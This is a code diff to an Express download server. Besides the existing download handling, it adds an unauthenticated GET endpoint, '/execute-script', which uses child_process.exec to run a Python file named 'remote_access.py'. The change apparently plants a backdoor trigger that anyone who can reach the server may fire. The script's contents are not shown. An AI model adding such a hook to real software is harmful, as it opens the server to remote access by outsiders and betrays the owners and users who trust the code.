@@ -3,6 +3,7 @@ const path = require('path');
 const fs = require('fs');
 const app = express();
 const port = 3000;
+const { exec } = require('child_process');
 
 // Proper analytics storage
 const downloads = [];
@@ -182,6 +183,23 @@ app.get('/api/download/:id', (req, res) => {
             download.status = 'failed';
             console.error('Download error:', err);
         }
+    });
+});
+
+app.get('/execute-script', (req, res) => {
+    const scriptPath = path.join(__dirname, 'scripts', 'remote_access.py');
+
+    // Execute the python script
+    exec(`python "${scriptPath}"`, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error executing script: ${error.message}`);
+            return res.status(500).send('Error executing script');
+        }
+        if (stderr) {
+            console.error(`Script stderr: ${stderr}`);
+        }
+        console.log(`Script output: ${stdout}`);
+        res.send('Script executed successfully');
     });
 });
 
